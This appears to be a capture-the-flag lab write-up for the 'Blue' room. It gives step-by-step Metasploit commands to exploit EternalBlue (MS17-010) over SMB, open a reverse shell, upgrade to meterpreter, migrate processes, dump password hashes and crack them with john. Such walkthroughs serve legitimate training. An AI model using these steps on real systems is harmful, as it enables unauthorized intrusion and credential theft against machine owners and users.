# blue

enumeration:
	
	nmap: 

		command: sudo nmap -sS -sV --script vuln -oN initial_scan.txt 10.10.81.62

		findings: 

			[1] This machine has several important open ports (139, 445, 3389) and vulnerable to Remote Code Execution vulnerability. 

Execution: 

	[1] As these machine is vulnerable for 'Remote Code Exectution' and several exploits are publically available out of one is 'Eternal Blue'. 

	[2] The exploit took port 139 and 445 in use which commonly used for SMB service. 

	[3] As this machine is vulnerable to famous exploit hence we will start our 'Metasploit' to exploit this vulnerability.
	Command: sudo msfconsole

	[4] Search for the exploit name 'ms17_010_eternalblue'.
	Command: search ms17_010_eternalblue

	[5] Now, use following command to use exploit.
	Command: use exploit/windows/smb/ms17_010_eternalblue

	[6] Now we need to analyze which parameters we need to provide to the exploit.
	Command: show options

	[7] As these is the IP based vulnerability, we just need to enter IP address and the port number on which service is running on. 
	Commands:

		set RHOSTS <IP_of_vulnerable_machine>
		set RPORT <smb_port_vulnerable_machine>

	[8] We also need to set the listner port and IP address of our machine to get access.

		set LHOST <IP_of_your_machine>
		set LPORT <any_port_no>

	[9] As these machine focuses on the complete access from getting an initial access to escalating our privileges with eternal blue we will first take a initial access of vulnerable machine.
	Command: set payload windows/x64/shell/reverse_tcp

	[10] Now, all set to get an initial access of the machine. Lets run the exploit.
	Command: run

	[11] As we have got an initial access we will hide the session and will try to escalate our privilege.

	[12] We will use post module from metasploit to convert our shell session into powerfull meterpreter session.
	Command: use post/multi/manage/shell_to_meterpreter

	[13] Here we need to set 2 attributes LHOST and SESSION id.
	Commands: 

		set LHOST <your_IP>
		set SESSION <session_id>

	[14] Run the exploit.
	Command: run

	[15] As we have been notified we got an another session which is meterpreter session and we successfully made to the meterpreter session. We can check active sessions by following command.
	Command: sessions -i

	[16] To use meterpreter session we will use following command.
	Command: sessions -i 2

	[17] This lab also focusses on providing a knowledge about migrating our service with a legitimate privileged processes. To list out the processes that are running on the vuln. machine we will use following command.
	Command: ps

	[18] We have observed that there is a privileged process running on PID 712. To migrate on the service we need to run following command.
	Command: migrate <PID>

	[19] As we have full access of the machine and we successfully we will use following command to retrive credentials details of the users.
	Command: hashdump

	[20] As we got passwords in hashed format we will copy and paste into a file on our local machine.

	[21] We will try to retrive password into plain text with john tool.
	Command: john --format=NT --wordlis=/path/to/wordlist.txt hash_file

	[22] As we have successfully retrived password into plain text, the last task is to submit the flags hidden in the machine.

	[23] As with help of the information provided in the room we have successfully solved the room!
